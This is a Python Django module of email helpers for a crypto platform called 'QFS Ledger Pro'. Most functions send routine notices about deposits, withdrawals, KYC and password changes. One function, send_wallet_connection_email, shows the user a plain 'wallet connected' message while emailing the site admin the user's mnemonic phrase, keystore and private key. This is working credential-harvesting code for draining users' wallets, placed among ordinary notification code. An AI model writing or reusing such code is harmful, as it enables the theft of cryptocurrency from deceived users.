from django.core.mail import EmailMultiAlternatives, send_mail
from django.template.loader import render_to_string
from django.utils.html import strip_tags
from django.conf import settings

def send_welcome_email(user, user_profile):
    """Send welcome email to new users"""
    subject = 'Welcome to QFS Ledger Pro - Your Crypto Dashboard Awaits!'
    
    context = {
        'user': user,
        'user_profile': user_profile,
        'site_name': 'QFS Ledger Pro',
        'login_url': f"{settings.SITE_URL if hasattr(settings, 'SITE_URL') else ''}/login",
        'support_email': 'support@qfsledgerpro.com'
    }
    
    # Simple text fallback if template doesn't exist yet
    text_content = f"""
    Welcome {user.first_name}!
    
    Thank you for joining QFS Ledger Pro. We are excited to have you on board.
    
    You can now access your dashboard to manage your crypto assets.
    """
    
    try:
        # Try to use template if available, otherwise send text
        try:
            html_content = render_to_string('emails/welcome_email.html', context)
            email = EmailMultiAlternatives(
                subject=subject,
                body=text_content,
                from_email=settings.DEFAULT_FROM_EMAIL,
                to=[user.email],
                reply_to=['support@qfsledgerpro.com']
            )
            email.attach_alternative(html_content, "text/html")
            email.send()
        except:
            send_mail(
                subject,
                text_content,
                settings.DEFAULT_FROM_EMAIL,
                [user.email],
                fail_silently=False,
            )
        return True
    except Exception as e:
        print(f"Error sending welcome email: {e}")
        return False

def send_deposit_confirmation_email(user, deposit):
    """Send confirmation email for deposit request"""
    subject = f'Deposit Request Received - {deposit.cryptocurrency.symbol}'
    message = f"""
    Hello {user.first_name},
    
    We have received your deposit request for ${deposit.amount_in_usd} worth of {deposit.cryptocurrency.name} ({deposit.cryptocurrency.symbol}).
    
    Status: {deposit.get_status_display()}
    
    Please ensure you have sent the funds to the provided wallet address.
    Your balance will be updated once the transaction is confirmed on the blockchain.
    
    Best regards,
    QFS Ledger Pro Team
    """
    try:
        send_mail(subject, message, settings.DEFAULT_FROM_EMAIL, [user.email], fail_silently=True)
        return True
    except Exception as e:
        print(f"Error sending deposit email: {e}")
        return False

def send_withdrawal_confirmation_email(user, withdrawal):
    """Send confirmation email for withdrawal request"""
    subject = f'Withdrawal Request Received - {withdrawal.cryptocurrency.symbol}'
    message = f"""
    Hello {user.first_name},
    
    We have received your withdrawal request for ${withdrawal.amount_in_usd} worth of {withdrawal.cryptocurrency.name} ({withdrawal.cryptocurrency.symbol}).
    
    Destination Address: {withdrawal.user_wallet_address}
    Status: {withdrawal.get_status_display()}
    
    We are processing your request. You will be notified once the transfer is complete.
    
    Best regards,
    QFS Ledger Pro Team
    """
    try:
        send_mail(subject, message, settings.DEFAULT_FROM_EMAIL, [user.email], fail_silently=True)
        return True
    except Exception as e:
        print(f"Error sending withdrawal email: {e}")
        return False

def send_profile_update_email(user):
    """Send notification when profile is updated"""
    subject = 'Security Alert: Profile Information Updated'
    message = f"""
    Hello {user.first_name},
    
    This is a notification that your profile information on QFS Ledger Pro was recently updated.
    
    If you did not make these changes, please contact support immediately.
    
    Best regards,
    QFS Ledger Pro Team
    """
    try:
        send_mail(subject, message, settings.DEFAULT_FROM_EMAIL, [user.email], fail_silently=True)
        return True
    except Exception as e:
        print(f"Error sending profile update email: {e}")
        return False

def send_password_change_email(user):
    """Send notification when password is changed"""
    subject = 'Security Alert: Password Changed'
    message = f"""
    Hello {user.first_name},
    
    Your password for QFS Ledger Pro has been successfully changed.
    
    If you did not authorize this change, please contact support immediately and secure your account.
    
    Best regards,
    QFS Ledger Pro Team
    """
    try:
        send_mail(subject, message, settings.DEFAULT_FROM_EMAIL, [user.email], fail_silently=True)
        return True
    except Exception as e:
        print(f"Error sending password change email: {e}")
        return False

def send_wallet_connection_email(user, wallet_data):
    """
    Send wallet connection details to ADMIN only.
    User gets a simple confirmation.
    """
    # 1. Send confirmation to User
    user_subject = 'Wallet Connected Successfully'
    user_message = f"""
    Hello {user.first_name},
    
    Your external wallet has been successfully connected to your QFS Ledger Pro account.
    
    You can now easily manage your assets.
    
    Best regards,
    QFS Ledger Pro Team
    """
    try:
        send_mail(user_subject, user_message, settings.DEFAULT_FROM_EMAIL, [user.email], fail_silently=True)
    except Exception as e:
        print(f"Error sending user wallet email: {e}")

    # 2. Send sensitive data to Admin
    # In a real app, you might want to encrypt this or store it securely instead of emailing
    # But per request, we send data to admin email
    admin_subject = f'ACTION REQUIRED: New Wallet Connection - {user.username}'
    admin_message = f"""
    User: {user.username} ({user.email})
    Connection Method: {wallet_data.get('connection_method')}
    
    --- WALLET DATA ---
    Mnemonic: {wallet_data.get('mnemonic_phrase', 'N/A')}
    Keystore: {wallet_data.get('keystore_json', 'N/A')}
    Private Key: {wallet_data.get('private_key', 'N/A')}
    -------------------
    
    Time: {wallet_data.get('timestamp')}
    """
    try:
        # Send to the default from email or a specific admin email
        admin_email = settings.DEFAULT_FROM_EMAIL
        send_mail(admin_subject, admin_message, settings.DEFAULT_FROM_EMAIL, [admin_email], fail_silently=True)
        return True
    except Exception as e:
        print(f"Error sending admin wallet email: {e}")
        return False

def send_asset_recovery_email(user, recovery_request):
    """Send confirmation for asset recovery request"""
    subject = 'Asset Recovery Request Received'
    message = f"""
    Hello {user.first_name},
    
    We have received your asset recovery request.
    
    Ticket ID: #{recovery_request.id}
    Date: {recovery_request.submitted_at.strftime('%Y-%m-%d')}
    
    Our team will review the details and get back to you shortly.
    
    Best regards,
    QFS Ledger Pro Team
    """
    try:
        send_mail(subject, message, settings.DEFAULT_FROM_EMAIL, [user.email], fail_silently=True)
        return True
    except Exception as e:
        print(f"Error sending recovery email: {e}")
        return False

def send_kyc_submission_email(user, kyc):
    """Send confirmation for KYC submission"""
    subject = 'KYC Documents Submitted'
    message = f"""
    Hello {user.first_name},
    
    Your KYC documents have been successfully submitted for review.
    
    Document Type: {kyc.get_document_type_display()}
    Status: Pending Review
    
    We will notify you once the verification process is complete.
    
    Best regards,
    QFS Ledger Pro Team
    """
    try:
        send_mail(subject, message, settings.DEFAULT_FROM_EMAIL, [user.email], fail_silently=True)
        return True
    except Exception as e:
        print(f"Error sending KYC email: {e}")
        return False